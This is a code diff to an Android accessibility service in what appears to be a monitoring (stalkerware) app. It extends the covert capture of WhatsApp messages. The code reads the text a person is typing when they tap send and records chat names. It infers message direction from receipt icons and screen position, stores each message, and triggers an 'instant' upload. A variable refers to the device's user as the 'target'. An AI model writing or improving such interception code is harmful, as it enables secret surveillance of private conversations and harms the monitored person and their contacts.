@@ -215,15 +215,27 @@ class BlockAccessibilityService : AccessibilityService() {
                                           cId.endsWith(":id/send")
 
                         if (isSendClick) {
-                            val sentText = lastWhatsAppComposerText
+                            var sentText = lastWhatsAppComposerText
+                            if (sentText.isNullOrBlank()) {
+                                try {
+                                    val entry = rootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.whatsapp:id/entry")?.firstOrNull()
+                                    val et = entry?.text?.toString()?.trim()
+                                    if (!et.isNullOrBlank() && !et.equals("Type a message", ignoreCase = true) && !et.equals("Message", ignoreCase = true)) {
+                                        sentText = et
+                                    }
+                                } catch (_: Exception) {}
+                            }
+
                             val chatTitle = getWhatsAppCurrentChatTitle(rootInActiveWindow)
                             if (!sentText.isNullOrBlank() && !chatTitle.isNullOrBlank()) {
                                 val now = System.currentTimeMillis()
+                                recordRecentSentWhatsAppText(sentText)
                                 val dedupeKey = "wa|$chatTitle|$sentText|true|text"
                                 if (capturedWhatsAppMsgHashes.add(dedupeKey)) {
                                     scope.launch {
                                         try {
                                             val db = AppDatabase.getInstance(applicationContext)
+                                            db.whatsAppMessageDao().updateToOutgoing(chatTitle, sentText, now - 600_000L)
                                             val existingId = db.whatsAppMessageDao().findExistingRecent(
                                                 chatTitle, sentText, true, now - 600_000L
                                             )
@@ -291,11 +303,13 @@ class BlockAccessibilityService : AccessibilityService() {
                         val chatTitle = getWhatsAppCurrentChatTitle(root)
                         if (!chatTitle.isNullOrBlank()) {
                             val now = System.currentTimeMillis()
+                            recordRecentSentWhatsAppText(sentText)
                             val dedupeKey = "wa|$chatTitle|$sentText|true|text"
                             if (capturedWhatsAppMsgHashes.add(dedupeKey)) {
                                 scope.launch {
                                     try {
                                         val db = AppDatabase.getInstance(applicationContext)
+                                        db.whatsAppMessageDao().updateToOutgoing(chatTitle, sentText, now - 600_000L)
                                         val existingId = db.whatsAppMessageDao().findExistingRecent(
                                             chatTitle, sentText, true, now - 600_000L
                                         )
@@ -368,6 +382,21 @@ class BlockAccessibilityService : AccessibilityService() {
     )
     private var lastClickedWhatsAppChat: String? = null
     private var lastWhatsAppComposerText: String? = null
+    private val recentSentWhatsAppTexts = java.util.concurrent.ConcurrentHashMap<String, Long>()
+
+    private fun recordRecentSentWhatsAppText(text: String?) {
+        if (text.isNullOrBlank()) return
+        val clean = text.lowercase().trim()
+        val now = System.currentTimeMillis()
+        recentSentWhatsAppTexts[clean] = now
+        val iterator = recentSentWhatsAppTexts.entries.iterator()
+        while (iterator.hasNext()) {
+            val entry = iterator.next()
+            if (now - entry.value > 120_000L) {
+                iterator.remove()
+            }
+        }
+    }
 
     private fun startWhatsAppPolling() {
         if (whatsAppPollRunnable != null) return
@@ -595,14 +624,51 @@ class BlockAccessibilityService : AccessibilityService() {
 
                 val rect = Rect()
                 node.getBoundsInScreen(rect)
-
-                // Right-aligned messages are outgoing (sent by user)
-                val isOutgoing = rect.left > (screenWidth * 0.35f) ||
-                                 (cd != null && (cd.contains("Delivered", ignoreCase = true) || cd.contains("Read", ignoreCase = true) || cd.contains("Sent", ignoreCase = true))) ||
-                                 extractedMsg.startsWith("You: ", ignoreCase = true)
+                val parentRect = Rect()
+                node.parent?.getBoundsInScreen(parentRect)
 
                 val cleanText = if (extractedMsg.startsWith("You: ", ignoreCase = true)) extractedMsg.substring(5).trim() else extractedMsg
                 if (cleanText.isBlank() || isWhatsAppUiMetadataOrTimestamp(cleanText)) continue
+
+                // Check delivery status icons / receipts on container or ancestors (Delivered, Read, Sent, Pending, Checkmarks)
+                var hasStatusIcon = false
+                var container = node.parent
+                var containerDepth = 0
+                while (container != null && containerDepth < 3) {
+                    for (i in 0 until container.childCount) {
+                        val ch = container.getChild(i) ?: continue
+                        val chId = (ch.viewIdResourceName ?: "").lowercase()
+                        val chDesc = (ch.contentDescription ?: "").toString().lowercase()
+                        if (chId.contains("status") || chId.contains("receipt") || chId.contains("msg_status") ||
+                            chDesc.contains("delivered") || chDesc.contains("read") || chDesc.contains("sent") ||
+                            chDesc.contains("pending") || chDesc.contains("clock") || chDesc.contains("check")) {
+                            hasStatusIcon = true
+                            break
+                        }
+                    }
+                    if (hasStatusIcon) break
+                    container = container.parent
+                    containerDepth++
+                }
+
+                val normalizedText = cleanText.lowercase().trim()
+                val lastSentTime = recentSentWhatsAppTexts[normalizedText]
+                val isRecentlySentByTarget = lastSentTime != null && (now - lastSentTime) < 120_000L
+
+                // Outgoing detection:
+                // 1. Text was recently sent from composer on this device
+                // 2. Bubble container has delivery receipt icon (Delivered, Read, Sent, Pending)
+                // 3. Message text starts with "You: "
+                // 4. Content description has receipt text
+                // 5. Bubble or text node is anchored to the right side of the screen
+                // 6. Node center is significantly right of screen center
+                val isOutgoing = isRecentlySentByTarget ||
+                                 hasStatusIcon ||
+                                 extractedMsg.startsWith("You: ", ignoreCase = true) ||
+                                 (cd != null && (cd.contains("Delivered", ignoreCase = true) || cd.contains("Read", ignoreCase = true) || cd.contains("Sent", ignoreCase = true))) ||
+                                 (parentRect.right >= (screenWidth * 0.80f) && parentRect.left > (screenWidth * 0.14f)) ||
+                                 (rect.right >= (screenWidth * 0.75f) && rect.left > (screenWidth * 0.14f)) ||
+                                 rect.centerX() > (screenWidth * 0.52f)
 
                 val reelUrl = findReelUrlNearby(node) ?: extractReelUrl(cleanText) ?: extractReelUrl(cd)
                 val isReel = reelUrl != null ||
@@ -673,14 +739,23 @@ class BlockAccessibilityService : AccessibilityService() {
                 scope.launch {
                     try {
                         val db = AppDatabase.getInstance(applicationContext)
-                        val filteredEntries = entriesToInsert.filter { entry ->
-                            val existingId = db.whatsAppMessageDao().findExistingRecent(
+                        val filteredEntries = mutableListOf<WhatsAppMessageEntry>()
+                        for (entry in entriesToInsert) {
+                            val existingDirection = db.whatsAppMessageDao().findRecentMessageDirection(
                                 entry.chatName,
                                 entry.messageText,
-                                entry.isOutgoing,
                                 entry.messageTimeEpochMs - 600_000L
                             )
-                            existingId == null
+                            if (existingDirection == null) {
+                                filteredEntries.add(entry)
+                            } else if (existingDirection == false && entry.isOutgoing) {
+                                db.whatsAppMessageDao().updateToOutgoing(
+                                    entry.chatName,
+                                    entry.messageText,
+                                    entry.messageTimeEpochMs - 600_000L
+                                )
+                                com.spapp.monitoring.collectors.RealtimeLogObserverManager.triggerInstantWhatsAppUpload(applicationContext)
+                            }
                         }
                         if (filteredEntries.isNotEmpty()) {
                             db.whatsAppMessageDao().insertAll(filteredEntries)
